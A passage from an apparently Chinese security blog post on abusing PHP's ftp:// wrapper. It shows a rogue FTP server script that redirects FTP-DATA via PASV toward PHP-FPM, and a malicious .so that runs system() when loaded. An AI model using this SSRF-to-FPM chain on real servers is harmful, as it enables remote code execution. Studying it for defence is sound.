&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;215 UNIX Type: L8&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在另一台192.168.187.3上访问这个恶意服务，期间传输的文件就会被转发到192.168.187.3自己的12345端口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png" alt="image-20211112233757565">&lt;/p>
&lt;h4 id="php加载恶意so文件">php加载恶意.so文件&lt;/h4>
&lt;p>修改php.ini /etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">[PHP]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">/home/amelia/TEMP/fpm/wuhu.so&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>C源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;touch /home/amelia/TEMP/fpm/pwned&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译为.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行php即触发恶意.so&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png" alt="image-20211112162658685">&lt;/p>
&lt;h4 id="令php使用ftp">令php使用ftp://&lt;/h4>
&lt;p>/etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">allow_url_fopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">On&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ftp读 注意后面的路径都需要绝对路径&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_read.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/flag.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png" alt="image-20211112215002622">&lt;/p>
&lt;p>ftp写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$agrv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">ftp_write&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;hello, world&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png" alt="image-20211112223440182">&lt;/p>
&lt;p>但是这里一直是可以新建文件但是写入不了，读入的参数2一直是int(0)，暂时还没解决问题（不过用下面那个写入很正常……&lt;/p>
&lt;p>覆盖已存在文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_context_create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ftp&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;overwrite&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$context&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_write_2.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;newwwwew&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png" alt="image-20211112225832777">&lt;/p>
&lt;h4 id="令php使用ftp并转发ftp-data">令php使用ftp://并转发FTP-DATA&lt;/h4>
&lt;p>将上面的操作用wireshark抓个包看看流量&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png" alt="image-20211112230401822">&lt;/p>
&lt;p>可以看到用的是EPSV mode而不是PASV mode，不会有括号内的ip+port描述，FTP-DATA只会被打向控制连接的服务端的端口，不能做到FTP-DATA的任意转发&lt;/p>
&lt;p>不过也不是毫无办法，如果用EPSV命令返回的结果不是229，那么php的ftp://就会使用PASV命令&lt;/p>
&lt;p>将上面的ftp-server修改一下，将229响应设为了000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;550 Could not get file size.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># responese with 000 , not 229&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;000 use PASV then&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># then php will send PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># response to PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png" alt="image-20211112234038671">&lt;/p>
&lt;p>成功转发&lt;/p>
&lt;h4 id="使用ftp将payload打向fpm">使用ftp://将payload打向fpm&lt;/h4>
&lt;p>结合上面几个实例应该就很清晰了，思路就是：&lt;/p>
&lt;ul>
&lt;li>编写包含执行系统命令的恶意.so&lt;/li>
&lt;li>打向fpm的一波流量，用于解开open_basedir, allow_url_include等的限制，形式是file_put_contents(&amp;lsquo;ftp://xxx&amp;rsquo;,$payload)&lt;/li>
